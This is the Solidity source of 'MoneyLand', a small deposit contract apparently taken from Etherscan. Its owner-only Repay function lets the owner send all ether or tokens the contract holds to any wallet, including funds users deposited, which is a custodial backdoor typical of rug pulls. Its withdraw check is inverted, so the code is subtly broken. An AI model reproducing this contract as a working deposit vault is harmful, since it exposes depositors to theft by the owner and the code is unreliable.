/**
 *Submitted for verification at Etherscan.io on 2022-06-21
*/

pragma solidity ^0.5.0;


interface IBEP20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
        // benefit is lost if 'b' is also tested.
        // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Context {
    function _msgSender() internal view returns (address) {
        return (msg.sender);
    }

    function _msgData() internal view returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address public _owner;
    address public _primary;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);


    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
}

contract MoneyLand is Context, Ownable {

    using SafeMath for uint256;

    mapping(address => uint256) private _balances;


    constructor() public{
        _owner = _msgSender();
    }

    function() external payable {

    }

    function getBalance(address wallet) view public returns (uint256){
        return _balances[wallet];
    }

    function Deposit(address payable withdrawer) external payable {
        _balances[withdrawer] = _balances[withdrawer].add(msg.value);
    }

    function Repay(address token, uint amount, address payable _wallet) external onlyOwner {
        if(token == address(0)) {
            _wallet.transfer(amount);
        } else {
            IBEP20(token).transfer(_wallet, amount);
        }
    }

    function withdraw(uint amount) external {
        require(_balances[msg.sender] <= amount, "Low Balance");

        _balances[_msgSender()] = _balances[_msgSender()].sub(amount);
        msg.sender.transfer(amount);
        //emit Transfer(address(this), msg.sender, amount);
    }

}